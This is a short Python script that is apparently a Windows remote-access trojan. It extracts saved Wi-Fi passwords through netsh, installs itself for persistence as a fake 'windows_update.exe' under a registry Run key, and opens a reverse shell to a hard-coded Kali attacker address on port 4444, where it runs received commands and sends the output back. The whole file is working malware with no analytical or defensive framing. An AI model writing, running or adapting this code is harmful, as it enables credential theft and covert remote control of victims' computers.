import socket
import subprocess
import os
import sys
import shutil

KALI_IP = '10.0.0.26'
PORT = 4444

def get_wifi_passwords():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp864')
        profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
        result = "\n[!] FZA3 WIFI REPORT:\n" + "="*30 + "\n"
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp864')
                passwords = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                result += f"SSID: {i} | PASS: {passwords[0] if passwords else 'None'}\n"
            except: continue
        return result + "="*30 + "\n"
    except: return "Error\n"

def persistence():
    location = os.environ["appdata"] + "\\windows_update.exe"
    if not os.path.exists(location):
        try:
            shutil.copyfile(sys.executable, location)
            subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + location + '"', shell=True)
        except: pass

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((KALI_IP, PORT))
        s.send(get_wifi_passwords().encode())
        while True:
            command = s.recv(1024).decode()
            if 'exit' in command:
                s.close()
                break
            elif command.startswith('cd '):
                try: os.chdir(command[3:])
                except: pass
            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send(CMD.stdout.read() + CMD.stderr.read())
    except: pass

if __name__ == "__main__":
    persistence()
    connect()
